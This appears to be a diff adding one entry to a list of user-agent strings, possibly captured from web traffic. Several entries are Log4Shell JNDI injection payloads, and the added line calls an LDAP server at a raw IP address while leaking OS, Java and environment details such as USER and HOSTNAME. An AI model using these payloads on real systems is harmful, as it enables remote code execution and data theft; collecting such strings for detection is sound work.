@@ -7444,3 +7444,4 @@ Mozilla/5.0 (Windows NT 6.1; Trident/7.0; FunWebProducts; rv:11.0 like Gecko)
 ${jndi:ldap://127.0.0.1#.${hostName}.useragent.d3qe7gf49vd8v4f7qkogtj3i36y5k83py.oast.site}
 ${jndi:ldap://${:-391}${:-917}.${hostName}.useragent.d3qe7gf49vd8v4f7qkogfmjqgmfuxzx7y.oast.site}
 Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MASP; rv:11.0 like Gecko)
+${jndi:ldap://45.135.194.44:1389/M0SygVAAAQDjSv5oAAAAAJPCEhg/${java:os};~${java:version};~${java:runtime};~${java:locale};~${sys:java.class.path};~${sys:user.country};~${sys:user.timezone};~${env:USER};~${env:USERNAME};~${env:PWD};~${env:HOSTNAME}}
